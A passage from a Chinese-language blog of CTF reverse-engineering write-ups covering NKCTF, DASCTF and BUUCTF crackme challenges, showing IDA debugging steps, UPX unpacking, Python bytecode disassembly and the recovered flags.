                ><br>将数字输入之后返回正确的认证成功 即上面获得数字就是我们所要提交的flag<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1679153394509-a5a481b0-a67a-4b72-b43e-69baa28c025f.png"
                      alt="image.png"
                ><br>参考文章：<br><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/OrientalGlass/article/details/129326915" >https://blog.csdn.net/OrientalGlass/article/details/129326915 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h1 id="re3车尾"><a href="#re3车尾" class="headerlink" title="re3车尾"></a>re3车尾</h1><p>上面卡在v5的输入那里，请教同学之后，可以使用动态调试将最后的结果爆破出来<br>ubantu运行.&#x2F;linux_sever64的程序，打好断点之后，Windows的ida动调程序开启<br>为了看起来比较简洁，将几个类型相同的变量组成一个新的数组<br>组成数组首先先选择最上面的变量，右键选择“Set lvar type”或者直接使用快捷键“Y”<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1679203253429-9ef95644-14f6-4dce-82ee-9052b5345752.png"
                      alt="image.png"
                ><br>定义好数组的名称和长度之后<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1679203296153-9448ac4e-3e3f-4c0a-acf4-948834a64b58.png"
                      alt="image.png"
                ><br>点击set the type 最后就好了<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1679203362994-e11139be-1877-41ab-a328-edb92a782d36.png"
                      alt="image.png"
                ><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1679203406754-ed1ad3f4-288c-4e5b-9bd0-180d0012f7ce.png"
                      alt="image.png"
                ><br>输入00000fffff,记录每一次循环sum值<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1679206435474-560e5556-05f1-49d9-ae97-c83ac362a23b.png"
                      alt="image.png"
                ><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/0/2023/png/23148330/1679210071031-c16cbeea-4821-4ce1-a2bf-38dd3c6222c2.png#averageHue=%23c6fcfc&clientId=u04c7bf77-de30-4&from=paste&height=358&id=u099d9675&originHeight=447&originWidth=1146&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=39356&status=done&style=none&taskId=uc38dc458-f4e0-41ad-a9d4-08c0f578fba&title=&width=916.8"
                      alt="image.png"
                ><br>输入00000fffff每一次循环记录  v7[0] &#x3D; 0x50;                  v9[0] &#x3D; v7[0];<br>  v7[1] &#x3D; 0xFAE3;              v9[1] &#x3D; v7[1];<br>  v7[2] &#x3D; 0xD7D3F7B;       v9[2] &#x3D; v7[2];<br>  v7[3] &#x3D; 0xA43499F6;      v9[3] &#x3D; v7[3];<br>  v7[4] &#x3D; 5;                        v9[4] &#x3D; (v7[4] &lt;&lt; 12) + v7[5];<br>  v7[5] &#x3D; 0x10;                  v9[5] &#x3D; v7[6];<br>  v7[6] &#x3D; 0xEF9;                v9[6] &#x3D; v5;<br>  v7[7]&#x3D;v5&#x3D;0xffff;</p>
<hr>
<p>i&#x3D;1<br>sum&#x3D;&#x3D;0x50;不符合sum&gt;0xFFFF；加下一个v7数组中的数据；<br>i&#x3D;2;<br>sum&#x3D;&#x3D;0xFB33&#x3D;&#x3D;0x50+0xFAE3&#x3D;&#x3D;0x50+v9[1]；<br>不符合sum&gt;0xFFFF，加下一个v7数组中的数据；<br>i&#x3D;3;<br>sum&#x3D;&#x3D;0xD7E3AAE&#x3D;&#x3D;0xFB33+0xD7D3F7B&#x3D;0x50+v9[2]；<br>符合sum&gt;0xFFFF，v7[7]取sum低四位0x3AAE；v7[8]取sum高位0xD7E；下一轮sum为v7[7]+v7[8]<br>i&#x3D;4;<br>sum&#x3D;&#x3D;0x482c&#x3D;&#x3D;v7[7]+v7[8]&#x3D;&#x3D;0x3AAE+0xD7E；<br>不符合sum&gt;0xFFFF，加下一个v7数组中的数据；<br>i&#x3D;5;<br>sum&#x3D;&#x3D;0xa434e222&#x3D;&#x3D;0x482c+0xA43499F6&#x3D;&#x3D;0x482c+v9[3]；<br>符合sum&gt;0xFFFF，v7[7]取sum低四位0xe222；v7[8]取sum高位0xa434；下一轮sum为v7[7]+v7[8]<br>i&#x3D;6;<br>sum&#x3D;&#x3D;0x18656&#x3D;&#x3D;v7[7]+v7[8]&#x3D;&#x3D;0xe222+0xa434;<br>符合sum&gt;0xFFFF，v7[7]取sum低四位0x8656；v7[8]取sum高位0x1；下一轮sum为v7[7]+v7[8]<br>i&#x3D;7;<br>sum&#x3D;&#x3D;0x8657&#x3D;&#x3D;v7[7]+v7[8]&#x3D;&#x3D;0x8656+0x1；不符合sum&gt;0xFFFF;<br>i&#x3D;8;<br>sum&#x3D;&#x3D;0xD667&#x3D;&#x3D;0x8657+0x5010&#x3D;&#x3D;0x8657+v9[4]；不符合sum&gt;0xFFFF;<br>i&#x3D;9;<br>sum&#x3D;&#x3D;0xE560&#x3D;&#x3D;0xD667+0xEF9&#x3D;&#x3D;0xD667+v9[5]；不符合sum&gt;0xFFFF;<br>sum&#x3D;0xE560+0xFFFF&#x3D;0x1e55f；<br>符合sum&gt;0xFFFF，v7[7]取sum低四位0xe55f，v7[8]取sum高位0x1，循环结束。<br>由于最后一次循环的0x1e55f是&gt;0xFFFF的，所以预测应该是返回”Error”，<br>最后返回也是“Error”即验证成功。<br>根据上面调试出来的结果，会发现一定的规律，sum是经过v7数组的元素进行相加分为两种情况<br>如果符合sum&gt;0xFFFF；v7[7]取sum低四位；v7[8]取sum剩余高位，且下一轮sum&#x3D;&#x3D;v7[7]+v7[8]；<br>如果不符合sum&gt;0xFFFF；sum+&#x3D;v9[i];<br>同时还要注意到一开始的输入格式，观察代码输入的s长度赋值给v3，长度需要大于6，查看函数中v11的值的话就会发现是之前输入的前五位“00000”，经过多次输入都是输入的前五位数字没有影响，紧接着是算出来的最小值1a9f，第十位作为校验码，多次输入后发现也是无论任意值</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;plz input the key:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(s);</span><br><span class="line"><span class="built_in">strncpy</span>(dest, v11, v3 - <span class="number">6</span>);</span><br><span class="line">  dest[<span class="built_in">strlen</span>(s) - <span class="number">6</span>] = <span class="number">0</span>;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1679206241029-435ac6ca-f9e7-49b6-bd93-7eb3c022bb63.png"
                      alt="image.png"
                ><br>确定flag{1a9f}<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1679206299896-4945de50-86d4-4a25-a7cf-3c49ae00a192.png"
                      alt="image.png"
                ></p>
<h1 id="逆向5"><a href="#逆向5" class="headerlink" title="逆向5"></a>逆向5</h1><p>call_1.exe 1.dll<br>运行call_1.exe文件，一个不完整的弹窗，ida进入主函数之后发现是<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1679218710670-e4bd5340-845b-4104-b4f7-12beea8eb9bc.png"
                      alt="image.png"
                ><br>转化成代码语言</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">	<span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="built_in">MessageBox</span>(<span class="literal">NULL</span>,<span class="literal">NULL</span>,错误,MB_OK);</span><br><span class="line">    	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>进入主函数发现根本没有上面推测的代码，所以说一个函数一个函数进入寻找，或者像之前的方法直接找是否存在字符串帮助更快的找到flag的线索。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1679223727944-617580b0-5618-494c-98b1-6682adb9cab2.png"
                      alt="image.png"
                ><br>直到进入sub_4015BD的函数，才发现存在可疑的地方：Str&#x3D;&#x3D;“dba54edb0?d6&gt;7??3ef0f1caf2ad3102”<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1679224018583-bc3b0421-133c-4fb5-a29e-8f37c7de95cf.png#averageHue=#fbfbfa&from=url&height=215&id=TyDKf&originHeight=278&originWidth=535&originalType=binary&ratio=1.png"
                     
                ><br>alt+a查看是否是弹窗上的文字，根据unicode转变结果看，应该只是会用到的普通的内容性字符串<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1679223906778-c8d9975e-72a4-4237-afd3-cd392b01671c.png"
                      alt="image.png"
                ><br>已知Str&#x3D;&#x3D;“dba54edb0?d6&gt;7??3ef0f1caf2ad3102”,所以，很明显Str[1]!&#x3D;1,直接return result，查看sub_401520函数。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1679224247008-a057a2f4-9c12-41b4-94e9-ad4022d94adc.png"
                      alt="image.png"
                ><br>line7：使用LoadLibraryA调用题目给的“1.dll”文件<br>line8：GetProcAddress(hModule, “H”) 从所给的动态链接库（1.dll）中获取函数的地址，并将其转换成一个可以在程序中调用的地址。（具体可百度）<br>for循环依次取Str里的值，作为参数传给H。sub_40163E()函数的putchar函数打印经过H处理Str[i]的内容。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1679224751361-a3c38368-925a-4dc0-8c7b-e2d5ebf460d0.png"
                      alt="image.png"
                ><br>动态调试：由于Str[1]!&#x3D;1，所以程序不会执行sub_401520函数中去，那么我们就想到可以直接改ZF符号，使他表示比较的结果是相等的，即在F7单步jnz后将ZF标志的0x00改为0x01</p>
<blockquote>
<p>在汇编语言中，ZF标志经常用于比较和跳转指令中。例如，当执行cmp指令时，如果比较结果为相等，则ZF标志被置为1，程序可以根据ZF标志的值来判断跳转条件。如果ZF标志为1，则表示比较结果为相等，程序会跳转到指定位置；如果ZF标志为0，则表示比较结果不相等，程序会继续执行后续指令。</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1679225078456-cc75da29-2ce6-46f3-b296-0deba0200d22.png"
                      alt="image.png"
                ><br>修改后进入sub_401520函数在sub_40163E函数处下断点，F9运行再F8执行sub_40163E函数，flag就出来了。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1679223414984-d835d193-b773-4a81-8343-cc8ee68a7440.png"
                      alt="image.png"
                ><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1679223396535-07cf01f7-57a2-4a33-9799-cfd8a5a79fdc.png"
                      alt="image.png"
                ><br>参考文章：<br><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45582916/article/details/118497453#5_107" >https://blog.csdn.net/weixin_45582916&#x2F;article&#x2F;details&#x2F;118497453#5_107 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a target="_blank" rel="noopener" href="https://wenku.baidu.com/view/63e8de76ccc789eb172ded630b1c59eef9c79a14.html?_wkts_=1679224381727&bdQuery=GetProcAddress(hModule,+%22H%22)">https://wenku.baidu.com/view/63e8de76ccc789eb172ded630b1c59eef9c79a14.html?<em>wkts</em>&#x3D;1679224381727&amp;bdQuery&#x3D;GetProcAddress%28hModule%2C+%22H%22%29</a></p>
<h1 id="BUUCTF-NKCTF-4月五周"><a href="#BUUCTF-NKCTF-4月五周" class="headerlink" title="BUUCTF-NKCTF-4月五周"></a>BUUCTF-NKCTF-4月五周</h1><h3 id="earlier"><a href="#earlier" class="headerlink" title="earlier"></a>earlier</h3><p>说是手动去除花指令，得靠感觉来，首先是看这个小东西，双击到位置改一改数据，一个就是u查看数据，将第一行的数据nop掉（ctrl+N）按c再将数据整理起来，函数也是，d展开，nop第一行，c整理起来，还一个就是push ebp那里大概会有函数，p一下如果可以建个函数。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1682255615337-bd105eba-980a-4158-890d-e721ec60729f.png"
                      alt="image.png"
                ></p>
<h1 id="DASCTF-Apr-2023-X-SU战队2023开局之战"><a href="#DASCTF-Apr-2023-X-SU战队2023开局之战" class="headerlink" title="DASCTF Apr.2023 X SU战队2023开局之战"></a>DASCTF Apr.2023 X SU战队2023开局之战</h1><h2 id="【简单】easyRE"><a href="#【简单】easyRE" class="headerlink" title="【简单】easyRE"></a>【简单】easyRE</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1682338613814-1d38cf94-03b0-4ad6-ab6d-85828642e938.png"
                      alt="image.png"
                ></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># visit https://tool.lu/pyc/ for more information</span><br><span class="line"># Version: Python 3.11</span><br><span class="line"></span><br><span class="line">import random</span><br><span class="line">r = random.Random(322376503)</span><br><span class="line">pt = input(&#x27;Enter your flag: &#x27;).encode()</span><br><span class="line">ct = b&#x27;%8b%cck%d3%ed%96%ffFb%06r%085%82%bc %b2%de)p%88Q`%1bf%18%b6QUSw%10%cd%d9%13A$%86%e5%cd%d9%ff&#x27;</span><br><span class="line">buf = []</span><br><span class="line"># WARNING: Decompyle incomplete</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>虽然说成功将exe文件剥离出了pyc文件，直接使用网站或者uncomply6无法直接逆向出源代码，所以使用pycdc工具来读python的字节码<a class="link"   target="_blank" rel="noopener" href="https://github.com/zrax/pycdc" >https://github.com/zrax/pycdc <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<div class="highlight-container" data-rel="Basic"><figure class="iseeu highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">File <span class="keyword">Name</span>: easyRE.py</span><br><span class="line">    Object <span class="keyword">Name</span>: &lt;module&gt;</span><br><span class="line">    Qualified <span class="keyword">Name</span>: &lt;module&gt;</span><br><span class="line">    Arg Count: <span class="number">0</span></span><br><span class="line">    <span class="keyword">Pos</span> Only Arg Count: <span class="number">0</span></span><br><span class="line">    KW Only Arg Count: <span class="number">0</span></span><br><span class="line">    Stack Size: <span class="number">7</span></span><br><span class="line">    Flags: <span class="number">0</span>x00000000</span><br><span class="line">    [Names]</span><br><span class="line">        <span class="comment">&#x27;random&#x27;</span></span><br><span class="line">        <span class="comment">&#x27;Random&#x27;</span></span><br><span class="line">        <span class="comment">&#x27;r&#x27;</span></span><br><span class="line">        <span class="comment">&#x27;input&#x27;</span></span><br><span class="line">        <span class="comment">&#x27;encode&#x27;</span></span><br><span class="line">        <span class="comment">&#x27;pt&#x27;</span></span><br><span class="line">        <span class="comment">&#x27;ct&#x27;</span></span><br><span class="line">        <span class="comment">&#x27;buf&#x27;</span></span><br><span class="line">        <span class="comment">&#x27;b&#x27;</span></span><br><span class="line">        <span class="comment">&#x27;append&#x27;</span></span><br><span class="line">        <span class="comment">&#x27;randint&#x27;</span></span><br><span class="line">        <span class="comment">&#x27;bytes&#x27;</span></span><br><span class="line">        <span class="comment">&#x27;print&#x27;</span></span><br><span class="line">    [Constants]</span><br><span class="line">        <span class="number">0</span></span><br><span class="line">        None</span><br><span class="line">        <span class="number">322376503</span></span><br><span class="line">        <span class="comment">&#x27;Enter your flag: &#x27;</span></span><br><span class="line">        b<span class="comment">&#x27;\x8b\xcck\xd3\xed\x96\xffFb\x06r\x085\x82\xbc \xb2\xde)p\x88Q`\x1bf\x18\xb6QUSw\x10\xcd\xd9\x13A$\x86\xe5\xcd\xd9\xff&#x27;</span></span><br><span class="line">        <span class="number">255</span></span><br><span class="line">        <span class="comment">&#x27;Correct!&#x27;</span></span><br><span class="line">    [Disassembly]</span><br><span class="line">        <span class="number">0</span>       <span class="keyword">RESUME</span>                        <span class="number">0</span></span><br><span class="line">        <span class="number">2</span>       LOAD_CONST                    <span class="number">0</span>: <span class="number">0</span></span><br><span class="line">        <span class="number">4</span>       LOAD_CONST                    <span class="number">1</span>: None</span><br><span class="line">        <span class="number">6</span>       IMPORT_NAME                   <span class="number">0</span>: random</span><br><span class="line">        <span class="number">8</span>       STORE_NAME                    <span class="number">0</span>: random</span><br><span class="line">        <span class="number">10</span>      PUSH_NULL                     </span><br><span class="line">        <span class="number">12</span>      LOAD_NAME                     <span class="number">0</span>: random</span><br><span class="line">        <span class="number">14</span>      LOAD_ATTR                     <span class="number">1</span>: Random</span><br><span class="line">        <span class="number">24</span>      LOAD_CONST                    <span class="number">2</span>: <span class="number">322376503</span></span><br><span class="line">        <span class="number">26</span>      PRECALL                       <span class="number">1</span></span><br><span class="line">        <span class="number">30</span>      <span class="keyword">CALL</span>                          <span class="number">1</span></span><br><span class="line">        <span class="number">40</span>      STORE_NAME                    <span class="number">2</span>: r</span><br><span class="line">        <span class="number">42</span>      PUSH_NULL                     </span><br><span class="line">        <span class="number">44</span>      LOAD_NAME                     <span class="number">3</span>: <span class="keyword">input</span></span><br><span class="line">        <span class="number">46</span>      LOAD_CONST                    <span class="number">3</span>: <span class="comment">&#x27;Enter your flag: &#x27;</span></span><br><span class="line">        <span class="number">48</span>      PRECALL                       <span class="number">1</span></span><br><span class="line">        <span class="number">52</span>      <span class="keyword">CALL</span>                          <span class="number">1</span></span><br><span class="line">        <span class="number">62</span>      LOAD_METHOD                   <span class="number">4</span>: encode</span><br><span class="line">        <span class="number">84</span>      PRECALL                       <span class="number">0</span></span><br><span class="line">        <span class="number">88</span>      <span class="keyword">CALL</span>                          <span class="number">0</span></span><br><span class="line">        <span class="number">98</span>      STORE_NAME                    <span class="number">5</span>: pt</span><br><span class="line">        <span class="number">100</span>     LOAD_CONST                    <span class="number">4</span>: b<span class="comment">&#x27;\x8b\xcck\xd3\xed\x96\xffFb\x06r\x085\x82\xbc \xb2\xde)p\x88Q`\x1bf\x18\xb6QUSw\x10\xcd\xd9\x13A$\x86\xe5\xcd\xd9\xff&#x27;</span></span><br><span class="line">        <span class="number">102</span>     STORE_NAME                    <span class="number">6</span>: ct</span><br><span class="line">        <span class="number">104</span>     BUILD_LIST                    <span class="number">0</span></span><br><span class="line">        <span class="number">106</span>     STORE_NAME                    <span class="number">7</span>: buf</span><br><span class="line">        <span class="number">108</span>     LOAD_NAME                     <span class="number">5</span>: pt</span><br><span class="line">        <span class="number">110</span>     GET_ITER                      </span><br><span class="line">        <span class="number">112</span>     FOR_ITER                      <span class="number">46</span> (<span class="keyword">to</span> <span class="number">206</span>)</span><br><span class="line">        <span class="number">114</span>     STORE_NAME                    <span class="number">8</span>: b</span><br><span class="line">        <span class="number">116</span>     LOAD_NAME                     <span class="number">7</span>: buf</span><br><span class="line">        <span class="number">118</span>     LOAD_METHOD                   <span class="number">9</span>: append</span><br><span class="line">        <span class="number">140</span>     LOAD_NAME                     <span class="number">2</span>: r</span><br><span class="line">        <span class="number">142</span>     LOAD_METHOD                   <span class="number">10</span>: randint</span><br><span class="line">        <span class="number">164</span>     LOAD_CONST                    <span class="number">0</span>: <span class="number">0</span></span><br><span class="line">        <span class="number">166</span>     LOAD_CONST                    <span class="number">5</span>: <span class="number">255</span></span><br><span class="line">        <span class="number">168</span>     PRECALL                       <span class="number">2</span></span><br><span class="line">        <span class="number">172</span>     <span class="keyword">CALL</span>                          <span class="number">2</span></span><br><span class="line">        <span class="number">182</span>     LOAD_NAME                     <span class="number">8</span>: b</span><br><span class="line">        <span class="number">184</span>     BINARY_OP                     <span class="number">12</span></span><br><span class="line">        <span class="number">188</span>     PRECALL                       <span class="number">1</span></span><br><span class="line">        <span class="number">192</span>     <span class="keyword">CALL</span>                          <span class="number">1</span></span><br><span class="line">        <span class="number">202</span>     POP_TOP                       </span><br><span class="line">        <span class="number">204</span>     JUMP_BACKWARD                 <span class="number">47</span></span><br><span class="line">        <span class="number">206</span>     PUSH_NULL                     </span><br><span class="line">        <span class="number">208</span>     LOAD_NAME                     <span class="number">11</span>: bytes</span><br><span class="line">        <span class="number">210</span>     LOAD_NAME                     <span class="number">7</span>: buf</span><br><span class="line">        <span class="number">212</span>     PRECALL                       <span class="number">1</span></span><br><span class="line">        <span class="number">216</span>     <span class="keyword">CALL</span>                          <span class="number">1</span></span><br><span class="line">        <span class="number">226</span>     LOAD_NAME                     <span class="number">6</span>: ct</span><br><span class="line">        <span class="number">228</span>     COMPARE_OP                    <span class="number">2</span> (==)</span><br><span class="line">        <span class="number">234</span>     POP_JUMP_FORWARD_IF_TRUE      <span class="number">2</span></span><br><span class="line">        <span class="number">236</span>     LOAD_ASSERTION_ERROR          </span><br><span class="line">        <span class="number">238</span>     RAISE_VARARGS                 <span class="number">1</span></span><br><span class="line">        <span class="number">240</span>     PUSH_NULL                     </span><br><span class="line">        <span class="number">242</span>     LOAD_NAME                     <span class="number">12</span>: <span class="keyword">print</span></span><br><span class="line">        <span class="number">244</span>     LOAD_CONST                    <span class="number">6</span>: <span class="comment">&#x27;Correct!&#x27;</span></span><br><span class="line">        <span class="number">246</span>     PRECALL                       <span class="number">1</span></span><br><span class="line">        <span class="number">250</span>     <span class="keyword">CALL</span>                          <span class="number">1</span></span><br><span class="line">        <span class="number">260</span>     POP_TOP                       </span><br><span class="line">        <span class="number">262</span>     LOAD_CONST                    <span class="number">1</span>: None</span><br><span class="line">        <span class="number">264</span>     RETURN_VALU</span><br></pre></td></tr></table></figure></div>

<h1 id="BUUCTF平台REVERSE刷题20230115-md"><a href="#BUUCTF平台REVERSE刷题20230115-md" class="headerlink" title="BUUCTF平台REVERSE刷题20230115.md"></a>BUUCTF平台REVERSE刷题20230115.md</h1><h2 id="reverse1"><a href="#reverse1" class="headerlink" title="reverse1"></a>reverse1</h2><p>直接快捷键shift+F12查找程序中的字符串找到类似flag的字符串<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1660583388411-2e1471b1-721e-4d13-8aee-4d29e341b472.png"
                      alt="图片.png"
                ><br>发现填入后不对继续跟进ctrl+x<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1660583449036-3039420c-436b-4fba-aa26-f16e37ddb00c.png"
                      alt="图片.png"
                ><br>在right flag那里看看有什么东西<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1660583583458-f4f7d11f-3591-41b8-a895-2e64083692a7.png"
                      alt="图片.png"
                ><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1660583703521-8698f2cf-087a-4283-878f-23613ca83c6e.png"
                      alt="图片.png"
                ><br>看到这里是将flag中的o（ASCII的111）改为0（ASCII的48)所以得到的flag是{hell0_w0rld}<br>###flag{hell0_w0rld}</p>
<h3 id="利用ascii将英文字符换为数字字符"><a href="#利用ascii将英文字符换为数字字符" class="headerlink" title="利用ascii将英文字符换为数字字符"></a>利用ascii将英文字符换为数字字符</h3><h2 id="reverse2"><a href="#reverse2" class="headerlink" title="reverse2"></a>reverse2</h2><p>查看字符串shift+F12，顺着找到flag的所处位置<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1660584129715-93028ff3-2ef6-4175-a8f9-0925fa864af7.png"
                      alt="图片.png"
                ><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1660584161777-7f310b00-abff-4350-9aea-51377d2b4ed6.png"
                      alt="图片.png"
                ><br>分析一下伪代码所要表达的内容：输入s2传入输入的flag，之后进行与正确flag字符的对比<br>这里的flag是7B，转化成十进制就是123，所以i要符合的条件值是？？？没有，所以for(…)循环是不存在程序运行过程中的。</p>
<blockquote>
<p>上面自己的分析貌似与题目意思有偏差,并且本人发现IDA中a快捷键的插件貌似没了，这个也要处理一下</p>
</blockquote>
<p>105、114与49都是ascii编码中的 即’i’、’r’与’1’，所以直接将一开始找的hacking_for_fun}中的i和r都改为1，即flag是{hack1ng_fo1_fun}<br>###flag{hack1ng_fo1_fun}</p>
<blockquote>
</blockquote>
<h3 id="判断将指出的特殊字符利用ascii换为数字字符"><a href="#判断将指出的特殊字符利用ascii换为数字字符" class="headerlink" title="判断将指出的特殊字符利用ascii换为数字字符"></a>判断将指出的特殊字符利用ascii换为数字字符</h3><h2 id="内涵的软件"><a href="#内涵的软件" class="headerlink" title="内涵的软件"></a>内涵的软件</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1660624960261-24daf645-97c1-4182-b1a8-59ce28427d99.png"
                      alt="图片.png"
                ><br>直接打开之后貌似就是flag<br>###flag{49d3c93df25caad81232130f3d2ebfad}</p>
<h2 id="新年快乐"><a href="#新年快乐" class="headerlink" title="新年快乐"></a>新年快乐</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1660626452013-74060c5b-6cae-41cf-9834-e0b5bd9910ac.png"
                      alt="图片.png"
                ><br>先放在DIE里判断一下文件的信息<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1660627462259-9c6039ad-9e8f-4967-8267-57dc1d6ac25b.png"
                      alt="图片.png"
                >发现是被upx加过壳的，所以首先要的就是先给程序脱壳<br>在upx目录下进行脱壳输入的命令：<code>upx -d xxxx.exe</code><br>需要注意的是要将文件放在与upx同目录下或者说直接连文件的位置一起输入进去<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1660627689419-42530de1-7178-4327-b583-e77208492da8.png"
                      alt="图片.png"
                >所以现在得到的程序就是已经拖过壳的程序<br>可由上图知程序是32位的所以我们放在32位的ida进行下一步的程序分析<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1660627796623-52ea9056-c3e4-4d28-abd0-1d28412ad0a7.png"
                      alt="图片.png"
                ><br>大概的逻辑思路是这样的</p>
<ul>
<li><p>首先是<code>strcpy(Str2,&quot;HappyNewYear!&quot;);</code></p>
